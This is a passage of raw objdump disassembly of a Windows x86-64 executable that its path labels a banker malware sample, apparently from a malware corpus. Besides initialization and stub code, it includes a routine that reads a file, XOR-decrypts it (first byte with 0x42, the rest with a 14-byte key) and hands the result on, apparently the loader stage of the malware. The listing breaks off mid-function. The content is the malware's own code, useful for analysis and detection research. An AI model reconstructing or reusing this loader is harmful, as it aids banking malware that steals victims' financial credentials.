
malware_samples/banker/1982694f914c3048c1fbea7e6223b8c0a82e41e92984a682c49a900c0f44dc83.exe:     file format pei-x86-64


Disassembly of section .text:

0000000069dc1000 <.text>:
    69dc1000:	48 8d 0d f9 8f 00 00 	lea    0x8ff9(%rip),%rcx        # 0x69dca000
    69dc1007:	e9 14 3e 00 00       	jmp    0x69dc4e20
    69dc100c:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc1010:	41 55                	push   %r13
    69dc1012:	41 54                	push   %r12
    69dc1014:	55                   	push   %rbp
    69dc1015:	57                   	push   %rdi
    69dc1016:	56                   	push   %rsi
    69dc1017:	53                   	push   %rbx
    69dc1018:	48 83 ec 28          	sub    $0x28,%rsp
    69dc101c:	85 d2                	test   %edx,%edx
    69dc101e:	49 89 cc             	mov    %rcx,%r12
    69dc1021:	4d 89 c5             	mov    %r8,%r13
    69dc1024:	75 7a                	jne    0x69dc10a0
    69dc1026:	8b 15 ec 8f 00 00    	mov    0x8fec(%rip),%edx        # 0x69dca018
    69dc102c:	31 c0                	xor    %eax,%eax
    69dc102e:	85 d2                	test   %edx,%edx
    69dc1030:	7e 59                	jle    0x69dc108b
    69dc1032:	83 ea 01             	sub    $0x1,%edx
    69dc1035:	48 8b 1d e4 63 00 00 	mov    0x63e4(%rip),%rbx        # 0x69dc7420
    69dc103c:	31 ed                	xor    %ebp,%ebp
    69dc103e:	bf 01 00 00 00       	mov    $0x1,%edi
    69dc1043:	89 15 cf 8f 00 00    	mov    %edx,0x8fcf(%rip)        # 0x69dca018
    69dc1049:	4c 8b 25 54 b3 00 00 	mov    0xb354(%rip),%r12        # 0x69dcc3a4
    69dc1050:	eb 08                	jmp    0x69dc105a
    69dc1052:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
    69dc1057:	41 ff d4             	call   *%r12
    69dc105a:	48 89 e8             	mov    %rbp,%rax
    69dc105d:	f0 48 0f b1 3b       	lock cmpxchg %rdi,(%rbx)
    69dc1062:	48 85 c0             	test   %rax,%rax
    69dc1065:	48 89 c6             	mov    %rax,%rsi
    69dc1068:	75 e8                	jne    0x69dc1052
    69dc106a:	48 8b 3d bf 63 00 00 	mov    0x63bf(%rip),%rdi        # 0x69dc7430
    69dc1071:	8b 07                	mov    (%rdi),%eax
    69dc1073:	83 f8 02             	cmp    $0x2,%eax
    69dc1076:	0f 84 e9 00 00 00    	je     0x69dc1165
    69dc107c:	b9 1f 00 00 00       	mov    $0x1f,%ecx
    69dc1081:	e8 82 3d 00 00       	call   0x69dc4e08
    69dc1086:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc108b:	48 83 c4 28          	add    $0x28,%rsp
    69dc108f:	5b                   	pop    %rbx
    69dc1090:	5e                   	pop    %rsi
    69dc1091:	5f                   	pop    %rdi
    69dc1092:	5d                   	pop    %rbp
    69dc1093:	41 5c                	pop    %r12
    69dc1095:	41 5d                	pop    %r13
    69dc1097:	c3                   	ret
    69dc1098:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc109f:	00 
    69dc10a0:	83 fa 01             	cmp    $0x1,%edx
    69dc10a3:	0f 85 aa 00 00 00    	jne    0x69dc1153
    69dc10a9:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
    69dc10b0:	00 00 
    69dc10b2:	48 8b 1d 67 63 00 00 	mov    0x6367(%rip),%rbx        # 0x69dc7420
    69dc10b9:	31 ff                	xor    %edi,%edi
    69dc10bb:	48 8b 70 08          	mov    0x8(%rax),%rsi
    69dc10bf:	48 8b 2d de b2 00 00 	mov    0xb2de(%rip),%rbp        # 0x69dcc3a4
    69dc10c6:	eb 18                	jmp    0x69dc10e0
    69dc10c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc10cf:	00 
    69dc10d0:	48 39 c6             	cmp    %rax,%rsi
    69dc10d3:	0f 84 b7 00 00 00    	je     0x69dc1190
    69dc10d9:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
    69dc10de:	ff d5                	call   *%rbp
    69dc10e0:	48 89 f8             	mov    %rdi,%rax
    69dc10e3:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
    69dc10e8:	48 85 c0             	test   %rax,%rax
    69dc10eb:	75 e3                	jne    0x69dc10d0
    69dc10ed:	31 ff                	xor    %edi,%edi
    69dc10ef:	48 8b 35 3a 63 00 00 	mov    0x633a(%rip),%rsi        # 0x69dc7430
    69dc10f6:	8b 06                	mov    (%rsi),%eax
    69dc10f8:	83 f8 01             	cmp    $0x1,%eax
    69dc10fb:	0f 84 ef 00 00 00    	je     0x69dc11f0
    69dc1101:	8b 06                	mov    (%rsi),%eax
    69dc1103:	85 c0                	test   %eax,%eax
    69dc1105:	0f 84 a5 00 00 00    	je     0x69dc11b0
    69dc110b:	8b 06                	mov    (%rsi),%eax
    69dc110d:	83 f8 01             	cmp    $0x1,%eax
    69dc1110:	0f 84 ba 00 00 00    	je     0x69dc11d0
    69dc1116:	85 ff                	test   %edi,%edi
    69dc1118:	0f 84 82 00 00 00    	je     0x69dc11a0
    69dc111e:	48 8b 05 bb 62 00 00 	mov    0x62bb(%rip),%rax        # 0x69dc73e0
    69dc1125:	48 8b 00             	mov    (%rax),%rax
    69dc1128:	48 85 c0             	test   %rax,%rax
    69dc112b:	74 0d                	je     0x69dc113a
    69dc112d:	4d 89 e8             	mov    %r13,%r8
    69dc1130:	ba 02 00 00 00       	mov    $0x2,%edx
    69dc1135:	4c 89 e1             	mov    %r12,%rcx
    69dc1138:	ff d0                	call   *%rax
    69dc113a:	83 05 d7 8e 00 00 01 	addl   $0x1,0x8ed7(%rip)        # 0x69dca018
    69dc1141:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc1146:	48 83 c4 28          	add    $0x28,%rsp
    69dc114a:	5b                   	pop    %rbx
    69dc114b:	5e                   	pop    %rsi
    69dc114c:	5f                   	pop    %rdi
    69dc114d:	5d                   	pop    %rbp
    69dc114e:	41 5c                	pop    %r12
    69dc1150:	41 5d                	pop    %r13
    69dc1152:	c3                   	ret
    69dc1153:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc1158:	48 83 c4 28          	add    $0x28,%rsp
    69dc115c:	5b                   	pop    %rbx
    69dc115d:	5e                   	pop    %rsi
    69dc115e:	5f                   	pop    %rdi
    69dc115f:	5d                   	pop    %rbp
    69dc1160:	41 5c                	pop    %r12
    69dc1162:	41 5d                	pop    %r13
    69dc1164:	c3                   	ret
    69dc1165:	48 8d 0d 94 8e 00 00 	lea    0x8e94(%rip),%rcx        # 0x69dca000
    69dc116c:	e8 af 3d 00 00       	call   0x69dc4f20
    69dc1171:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
    69dc1177:	48 87 33             	xchg   %rsi,(%rbx)
    69dc117a:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc117f:	48 83 c4 28          	add    $0x28,%rsp
    69dc1183:	5b                   	pop    %rbx
    69dc1184:	5e                   	pop    %rsi
    69dc1185:	5f                   	pop    %rdi
    69dc1186:	5d                   	pop    %rbp
    69dc1187:	41 5c                	pop    %r12
    69dc1189:	41 5d                	pop    %r13
    69dc118b:	c3                   	ret
    69dc118c:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc1190:	bf 01 00 00 00       	mov    $0x1,%edi
    69dc1195:	e9 55 ff ff ff       	jmp    0x69dc10ef
    69dc119a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc11a0:	31 c0                	xor    %eax,%eax
    69dc11a2:	48 87 03             	xchg   %rax,(%rbx)
    69dc11a5:	e9 74 ff ff ff       	jmp    0x69dc111e
    69dc11aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc11b0:	48 8b 15 b9 62 00 00 	mov    0x62b9(%rip),%rdx        # 0x69dc7470
    69dc11b7:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
    69dc11bd:	48 8b 0d 9c 62 00 00 	mov    0x629c(%rip),%rcx        # 0x69dc7460
    69dc11c4:	e8 1f 3c 00 00       	call   0x69dc4de8
    69dc11c9:	e9 3d ff ff ff       	jmp    0x69dc110b
    69dc11ce:	66 90                	xchg   %ax,%ax
    69dc11d0:	48 8b 15 79 62 00 00 	mov    0x6279(%rip),%rdx        # 0x69dc7450
    69dc11d7:	48 8b 0d 62 62 00 00 	mov    0x6262(%rip),%rcx        # 0x69dc7440
    69dc11de:	e8 05 3c 00 00       	call   0x69dc4de8
    69dc11e3:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
    69dc11e9:	e9 28 ff ff ff       	jmp    0x69dc1116
    69dc11ee:	66 90                	xchg   %ax,%ax
    69dc11f0:	b9 1f 00 00 00       	mov    $0x1f,%ecx
    69dc11f5:	e8 0e 3c 00 00       	call   0x69dc4e08
    69dc11fa:	e9 0c ff ff ff       	jmp    0x69dc110b
    69dc11ff:	90                   	nop
    69dc1200:	41 54                	push   %r12
    69dc1202:	55                   	push   %rbp
    69dc1203:	57                   	push   %rdi
    69dc1204:	56                   	push   %rsi
    69dc1205:	53                   	push   %rbx
    69dc1206:	48 83 ec 20          	sub    $0x20,%rsp
    69dc120a:	48 8b 35 ff 61 00 00 	mov    0x61ff(%rip),%rsi        # 0x69dc7410
    69dc1211:	85 d2                	test   %edx,%edx
    69dc1213:	48 89 cf             	mov    %rcx,%rdi
    69dc1216:	89 d3                	mov    %edx,%ebx
    69dc1218:	89 16                	mov    %edx,(%rsi)
    69dc121a:	4c 89 c5             	mov    %r8,%rbp
    69dc121d:	75 54                	jne    0x69dc1273
    69dc121f:	8b 05 f3 8d 00 00    	mov    0x8df3(%rip),%eax        # 0x69dca018
    69dc1225:	85 c0                	test   %eax,%eax
    69dc1227:	74 33                	je     0x69dc125c
    69dc1229:	e8 12 28 00 00       	call   0x69dc3a40
    69dc122e:	49 89 e8             	mov    %rbp,%r8
    69dc1231:	31 d2                	xor    %edx,%edx
    69dc1233:	48 89 f9             	mov    %rdi,%rcx
    69dc1236:	e8 75 01 00 00       	call   0x69dc13b0
    69dc123b:	49 89 e8             	mov    %rbp,%r8
    69dc123e:	89 da                	mov    %ebx,%edx
    69dc1240:	48 89 f9             	mov    %rdi,%rcx
    69dc1243:	e8 d8 35 00 00       	call   0x69dc4820
    69dc1248:	49 89 e8             	mov    %rbp,%r8
    69dc124b:	89 da                	mov    %ebx,%edx
    69dc124d:	48 89 f9             	mov    %rdi,%rcx
    69dc1250:	41 89 c4             	mov    %eax,%r12d
    69dc1253:	e8 b8 fd ff ff       	call   0x69dc1010
    69dc1258:	85 c0                	test   %eax,%eax
    69dc125a:	75 03                	jne    0x69dc125f
    69dc125c:	45 31 e4             	xor    %r12d,%r12d
    69dc125f:	44 89 e0             	mov    %r12d,%eax
    69dc1262:	c7 06 ff ff ff ff    	movl   $0xffffffff,(%rsi)
    69dc1268:	48 83 c4 20          	add    $0x20,%rsp
    69dc126c:	5b                   	pop    %rbx
    69dc126d:	5e                   	pop    %rsi
    69dc126e:	5f                   	pop    %rdi
    69dc126f:	5d                   	pop    %rbp
    69dc1270:	41 5c                	pop    %r12
    69dc1272:	c3                   	ret
    69dc1273:	e8 c8 27 00 00       	call   0x69dc3a40
    69dc1278:	8d 43 ff             	lea    -0x1(%rbx),%eax
    69dc127b:	83 f8 01             	cmp    $0x1,%eax
    69dc127e:	76 20                	jbe    0x69dc12a0
    69dc1280:	49 89 e8             	mov    %rbp,%r8
    69dc1283:	89 da                	mov    %ebx,%edx
    69dc1285:	48 89 f9             	mov    %rdi,%rcx
    69dc1288:	e8 23 01 00 00       	call   0x69dc13b0
    69dc128d:	83 fb 03             	cmp    $0x3,%ebx
    69dc1290:	41 89 c4             	mov    %eax,%r12d
    69dc1293:	75 ca                	jne    0x69dc125f
    69dc1295:	eb a4                	jmp    0x69dc123b
    69dc1297:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc129e:	00 00 
    69dc12a0:	49 89 e8             	mov    %rbp,%r8
    69dc12a3:	89 da                	mov    %ebx,%edx
    69dc12a5:	48 89 f9             	mov    %rdi,%rcx
    69dc12a8:	e8 63 fd ff ff       	call   0x69dc1010
    69dc12ad:	85 c0                	test   %eax,%eax
    69dc12af:	74 ab                	je     0x69dc125c
    69dc12b1:	49 89 e8             	mov    %rbp,%r8
    69dc12b4:	89 da                	mov    %ebx,%edx
    69dc12b6:	48 89 f9             	mov    %rdi,%rcx
    69dc12b9:	e8 62 35 00 00       	call   0x69dc4820
    69dc12be:	85 c0                	test   %eax,%eax
    69dc12c0:	41 89 c4             	mov    %eax,%r12d
    69dc12c3:	74 5b                	je     0x69dc1320
    69dc12c5:	83 fb 01             	cmp    $0x1,%ebx
    69dc12c8:	75 b6                	jne    0x69dc1280
    69dc12ca:	e8 c1 22 00 00       	call   0x69dc3590
    69dc12cf:	49 89 e8             	mov    %rbp,%r8
    69dc12d2:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc12d7:	48 89 f9             	mov    %rdi,%rcx
    69dc12da:	e8 d1 00 00 00       	call   0x69dc13b0
    69dc12df:	85 c0                	test   %eax,%eax
    69dc12e1:	41 89 c4             	mov    %eax,%r12d
    69dc12e4:	0f 85 75 ff ff ff    	jne    0x69dc125f
    69dc12ea:	49 89 e8             	mov    %rbp,%r8
    69dc12ed:	31 d2                	xor    %edx,%edx
    69dc12ef:	48 89 f9             	mov    %rdi,%rcx
    69dc12f2:	e8 b9 00 00 00       	call   0x69dc13b0
    69dc12f7:	49 89 e8             	mov    %rbp,%r8
    69dc12fa:	31 d2                	xor    %edx,%edx
    69dc12fc:	48 89 f9             	mov    %rdi,%rcx
    69dc12ff:	e8 1c 35 00 00       	call   0x69dc4820
    69dc1304:	49 89 e8             	mov    %rbp,%r8
    69dc1307:	31 d2                	xor    %edx,%edx
    69dc1309:	48 89 f9             	mov    %rdi,%rcx
    69dc130c:	e8 ff fc ff ff       	call   0x69dc1010
    69dc1311:	e9 49 ff ff ff       	jmp    0x69dc125f
    69dc1316:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc131d:	00 00 00 
    69dc1320:	83 fb 01             	cmp    $0x1,%ebx
    69dc1323:	0f 85 33 ff ff ff    	jne    0x69dc125c
    69dc1329:	eb d9                	jmp    0x69dc1304
    69dc132b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc1330:	48 83 ec 48          	sub    $0x48,%rsp
    69dc1334:	48 8b 05 45 61 00 00 	mov    0x6145(%rip),%rax        # 0x69dc7480
    69dc133b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
    69dc1341:	83 fa 01             	cmp    $0x1,%edx
    69dc1344:	74 0a                	je     0x69dc1350
    69dc1346:	48 83 c4 48          	add    $0x48,%rsp
    69dc134a:	e9 b1 fe ff ff       	jmp    0x69dc1200
    69dc134f:	90                   	nop
    69dc1350:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
    69dc1355:	89 54 24 34          	mov    %edx,0x34(%rsp)
    69dc1359:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
    69dc135e:	e8 4d 22 00 00       	call   0x69dc35b0
    69dc1363:	e8 38 2b 00 00       	call   0x69dc3ea0
    69dc1368:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
    69dc136d:	8b 54 24 34          	mov    0x34(%rsp),%edx
    69dc1371:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    69dc1376:	48 83 c4 48          	add    $0x48,%rsp
    69dc137a:	e9 81 fe ff ff       	jmp    0x69dc1200
    69dc137f:	90                   	nop
    69dc1380:	48 89 ca             	mov    %rcx,%rdx
    69dc1383:	48 8d 0d 76 8c 00 00 	lea    0x8c76(%rip),%rcx        # 0x69dca000
    69dc138a:	e9 c1 3a 00 00       	jmp    0x69dc4e50
    69dc138f:	90                   	nop
    69dc1390:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x69dc13a0
    69dc1397:	e9 e4 ff ff ff       	jmp    0x69dc1380
    69dc139c:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc13a0:	c3                   	ret
    69dc13a1:	90                   	nop
    69dc13a2:	90                   	nop
    69dc13a3:	90                   	nop
    69dc13a4:	90                   	nop
    69dc13a5:	90                   	nop
    69dc13a6:	90                   	nop
    69dc13a7:	90                   	nop
    69dc13a8:	90                   	nop
    69dc13a9:	90                   	nop
    69dc13aa:	90                   	nop
    69dc13ab:	90                   	nop
    69dc13ac:	90                   	nop
    69dc13ad:	90                   	nop
    69dc13ae:	90                   	nop
    69dc13af:	90                   	nop
    69dc13b0:	48 83 ec 28          	sub    $0x28,%rsp
    69dc13b4:	85 d2                	test   %edx,%edx
    69dc13b6:	74 5d                	je     0x69dc1415
    69dc13b8:	83 fa 01             	cmp    $0x1,%edx
    69dc13bb:	75 30                	jne    0x69dc13ed
    69dc13bd:	ff 15 09 af 00 00    	call   *0xaf09(%rip)        # 0x69dcc2cc
    69dc13c3:	4c 8d 05 36 5c 00 00 	lea    0x5c36(%rip),%r8        # 0x69dc7000
    69dc13ca:	31 d2                	xor    %edx,%edx
    69dc13cc:	31 c9                	xor    %ecx,%ecx
    69dc13ce:	ff 15 e8 ae 00 00    	call   *0xaee8(%rip)        # 0x69dcc2bc
    69dc13d4:	48 85 c0             	test   %rax,%rax
    69dc13d7:	48 89 05 42 8c 00 00 	mov    %rax,0x8c42(%rip)        # 0x69dca020
    69dc13de:	74 20                	je     0x69dc1400
    69dc13e0:	ff 15 16 af 00 00    	call   *0xaf16(%rip)        # 0x69dcc2fc
    69dc13e6:	3d b7 00 00 00       	cmp    $0xb7,%eax
    69dc13eb:	74 13                	je     0x69dc1400
    69dc13ed:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc13f2:	48 83 c4 28          	add    $0x28,%rsp
    69dc13f6:	c3                   	ret
    69dc13f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc13fe:	00 00 
    69dc1400:	48 c7 05 15 8c 00 00 	movq   $0x0,0x8c15(%rip)        # 0x69dca020
    69dc1407:	00 00 00 00 
    69dc140b:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc1410:	48 83 c4 28          	add    $0x28,%rsp
    69dc1414:	c3                   	ret
    69dc1415:	48 8b 0d 04 8c 00 00 	mov    0x8c04(%rip),%rcx        # 0x69dca020
    69dc141c:	48 85 c9             	test   %rcx,%rcx
    69dc141f:	74 06                	je     0x69dc1427
    69dc1421:	ff 15 8d ae 00 00    	call   *0xae8d(%rip)        # 0x69dcc2b4
    69dc1427:	48 8b 0d fa 8b 00 00 	mov    0x8bfa(%rip),%rcx        # 0x69dca028
    69dc142e:	48 85 c9             	test   %rcx,%rcx
    69dc1431:	74 ba                	je     0x69dc13ed
    69dc1433:	e8 18 10 00 00       	call   0x69dc2450
    69dc1438:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc143d:	48 c7 05 e0 8b 00 00 	movq   $0x0,0x8be0(%rip)        # 0x69dca028
    69dc1444:	00 00 00 00 
    69dc1448:	48 83 c4 28          	add    $0x28,%rsp
    69dc144c:	c3                   	ret
    69dc144d:	0f 1f 00             	nopl   (%rax)
    69dc1450:	b8 0c 00 00 00       	mov    $0xc,%eax
    69dc1455:	c3                   	ret
    69dc1456:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc145d:	00 00 00 
    69dc1460:	b8 0e 00 00 00       	mov    $0xe,%eax
    69dc1465:	c3                   	ret
    69dc1466:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc146d:	00 00 00 
    69dc1470:	b8 0d 00 00 00       	mov    $0xd,%eax
    69dc1475:	c3                   	ret
    69dc1476:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc147d:	00 00 00 
    69dc1480:	b8 14 00 00 00       	mov    $0x14,%eax
    69dc1485:	c3                   	ret
    69dc1486:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc148d:	00 00 00 
    69dc1490:	b8 1e 00 00 00       	mov    $0x1e,%eax
    69dc1495:	c3                   	ret
    69dc1496:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc149d:	00 00 00 
    69dc14a0:	b8 16 00 00 00       	mov    $0x16,%eax
    69dc14a5:	c3                   	ret
    69dc14a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc14ad:	00 00 00 
    69dc14b0:	b8 17 00 00 00       	mov    $0x17,%eax
    69dc14b5:	c3                   	ret
    69dc14b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc14bd:	00 00 00 
    69dc14c0:	b8 0a 00 00 00       	mov    $0xa,%eax
    69dc14c5:	c3                   	ret
    69dc14c6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc14cd:	00 00 00 
    69dc14d0:	b8 12 00 00 00       	mov    $0x12,%eax
    69dc14d5:	c3                   	ret
    69dc14d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc14dd:	00 00 00 
    69dc14e0:	b8 21 00 00 00       	mov    $0x21,%eax
    69dc14e5:	c3                   	ret
    69dc14e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc14ed:	00 00 00 
    69dc14f0:	b8 1f 00 00 00       	mov    $0x1f,%eax
    69dc14f5:	c3                   	ret
    69dc14f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc14fd:	00 00 00 
    69dc1500:	b8 28 00 00 00       	mov    $0x28,%eax
    69dc1505:	c3                   	ret
    69dc1506:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc150d:	00 00 00 
    69dc1510:	b8 32 00 00 00       	mov    $0x32,%eax
    69dc1515:	c3                   	ret
    69dc1516:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc151d:	00 00 00 
    69dc1520:	b8 3c 00 00 00       	mov    $0x3c,%eax
    69dc1525:	c3                   	ret
    69dc1526:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc152d:	00 00 00 
    69dc1530:	b8 41 00 00 00       	mov    $0x41,%eax
    69dc1535:	c3                   	ret
    69dc1536:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc153d:	00 00 00 
    69dc1540:	b8 46 00 00 00       	mov    $0x46,%eax
    69dc1545:	c3                   	ret
    69dc1546:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc154d:	00 00 00 
    69dc1550:	b8 4b 00 00 00       	mov    $0x4b,%eax
    69dc1555:	c3                   	ret
    69dc1556:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc155d:	00 00 00 
    69dc1560:	b8 50 00 00 00       	mov    $0x50,%eax
    69dc1565:	c3                   	ret
    69dc1566:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc156d:	00 00 00 
    69dc1570:	b8 5a 00 00 00       	mov    $0x5a,%eax
    69dc1575:	c3                   	ret
    69dc1576:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc157d:	00 00 00 
    69dc1580:	b8 63 00 00 00       	mov    $0x63,%eax
    69dc1585:	c3                   	ret
    69dc1586:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc158d:	00 00 00 
    69dc1590:	b8 58 00 00 00       	mov    $0x58,%eax
    69dc1595:	c3                   	ret
    69dc1596:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc159d:	00 00 00 
    69dc15a0:	b8 53 00 00 00       	mov    $0x53,%eax
    69dc15a5:	c3                   	ret
    69dc15a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc15ad:	00 00 00 
    69dc15b0:	57                   	push   %rdi
    69dc15b1:	56                   	push   %rsi
    69dc15b2:	53                   	push   %rbx
    69dc15b3:	48 83 ec 20          	sub    $0x20,%rsp
    69dc15b7:	48 8b 0d 62 8a 00 00 	mov    0x8a62(%rip),%rcx        # 0x69dca020
    69dc15be:	48 85 c9             	test   %rcx,%rcx
    69dc15c1:	74 0c                	je     0x69dc15cf
    69dc15c3:	31 d2                	xor    %edx,%edx
    69dc15c5:	ff 15 19 ae 00 00    	call   *0xae19(%rip)        # 0x69dcc3e4
    69dc15cb:	85 c0                	test   %eax,%eax
    69dc15cd:	74 11                	je     0x69dc15e0
    69dc15cf:	48 83 c4 20          	add    $0x20,%rsp
    69dc15d3:	5b                   	pop    %rbx
    69dc15d4:	5e                   	pop    %rsi
    69dc15d5:	5f                   	pop    %rdi
    69dc15d6:	c3                   	ret
    69dc15d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc15de:	00 00 
    69dc15e0:	48 8d 15 4b 5a 00 00 	lea    0x5a4b(%rip),%rdx        # 0x69dc7032
    69dc15e7:	48 8d 0d 47 5a 00 00 	lea    0x5a47(%rip),%rcx        # 0x69dc7035
    69dc15ee:	e8 a5 37 00 00       	call   0x69dc4d98
    69dc15f3:	48 85 c0             	test   %rax,%rax
    69dc15f6:	48 89 c6             	mov    %rax,%rsi
    69dc15f9:	74 6c                	je     0x69dc1667
    69dc15fb:	31 d2                	xor    %edx,%edx
    69dc15fd:	41 b8 02 00 00 00    	mov    $0x2,%r8d
    69dc1603:	48 89 c1             	mov    %rax,%rcx
    69dc1606:	e8 a5 35 00 00       	call   0x69dc4bb0
    69dc160b:	48 89 f1             	mov    %rsi,%rcx
    69dc160e:	e8 4d 33 00 00       	call   0x69dc4960
    69dc1613:	45 31 c0             	xor    %r8d,%r8d
    69dc1616:	31 d2                	xor    %edx,%edx
    69dc1618:	48 89 f1             	mov    %rsi,%rcx
    69dc161b:	48 89 c7             	mov    %rax,%rdi
    69dc161e:	e8 8d 35 00 00       	call   0x69dc4bb0
    69dc1623:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
    69dc1627:	48 3d ff ff ff 3f    	cmp    $0x3fffffff,%rax
    69dc162d:	77 30                	ja     0x69dc165f
    69dc162f:	48 89 f9             	mov    %rdi,%rcx
    69dc1632:	e8 39 37 00 00       	call   0x69dc4d70
    69dc1637:	48 85 c0             	test   %rax,%rax
    69dc163a:	48 89 c3             	mov    %rax,%rbx
    69dc163d:	74 20                	je     0x69dc165f
    69dc163f:	49 89 f1             	mov    %rsi,%r9
    69dc1642:	49 89 f8             	mov    %rdi,%r8
    69dc1645:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc164a:	48 89 c1             	mov    %rax,%rcx
    69dc164d:	e8 3e 37 00 00       	call   0x69dc4d90
    69dc1652:	48 39 c7             	cmp    %rax,%rdi
    69dc1655:	74 29                	je     0x69dc1680
    69dc1657:	48 89 d9             	mov    %rbx,%rcx
    69dc165a:	e8 29 37 00 00       	call   0x69dc4d88
    69dc165f:	48 89 f1             	mov    %rsi,%rcx
    69dc1662:	e8 49 37 00 00       	call   0x69dc4db0
    69dc1667:	48 8b 0d b2 89 00 00 	mov    0x89b2(%rip),%rcx        # 0x69dca020
    69dc166e:	48 83 c4 20          	add    $0x20,%rsp
    69dc1672:	5b                   	pop    %rbx
    69dc1673:	5e                   	pop    %rsi
    69dc1674:	5f                   	pop    %rdi
    69dc1675:	48 ff 25 f0 ac 00 00 	rex.W jmp *0xacf0(%rip)        # 0x69dcc36c
    69dc167c:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc1680:	48 89 f1             	mov    %rsi,%rcx
    69dc1683:	e8 28 37 00 00       	call   0x69dc4db0
    69dc1688:	80 33 42             	xorb   $0x42,(%rbx)
    69dc168b:	48 83 ff 01          	cmp    $0x1,%rdi
    69dc168f:	74 49                	je     0x69dc16da
    69dc1691:	4c 8d 0d a9 59 00 00 	lea    0x59a9(%rip),%r9        # 0x69dc7041
    69dc1698:	b9 01 00 00 00       	mov    $0x1,%ecx
    69dc169d:	49 b8 25 49 92 24 49 	movabs $0x4924924924924925,%r8
    69dc16a4:	92 24 49 
    69dc16a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc16ae:	00 00 
    69dc16b0:	48 89 ca             	mov    %rcx,%rdx
    69dc16b3:	48 d1 ea             	shr    $1,%rdx
    69dc16b6:	48 89 d0             	mov    %rdx,%rax
    69dc16b9:	49 f7 e0             	mul    %r8
    69dc16bc:	48 89 c8             	mov    %rcx,%rax
    69dc16bf:	48 d1 ea             	shr    $1,%rdx
    69dc16c2:	48 6b d2 0e          	imul   $0xe,%rdx,%rdx
    69dc16c6:	48 29 d0             	sub    %rdx,%rax
    69dc16c9:	41 0f b6 04 01       	movzbl (%r9,%rax,1),%eax
    69dc16ce:	30 04 0b             	xor    %al,(%rbx,%rcx,1)
    69dc16d1:	48 83 c1 01          	add    $0x1,%rcx
    69dc16d5:	48 39 cf             	cmp    %rcx,%rdi
    69dc16d8:	75 d6                	jne    0x69dc16b0
    69dc16da:	48 89 fa             	mov    %rdi,%rdx
    69dc16dd:	48 89 d9             	mov    %rbx,%rcx
    69dc16e0:	e8 6b 13 00 00       	call   0x69dc2a50
    69dc16e5:	48 89 d9             	mov    %rbx,%rcx
    69dc16e8:	48 89 c6             	mov    %rax,%rsi
    69dc16eb:	e8 98 36 00 00       	call   0x69dc4d88
    69dc16f0:	48 85 f6             	test   %rsi,%rsi
    69dc16f3:	0f 84 6e ff ff ff    	je     0x69dc1667
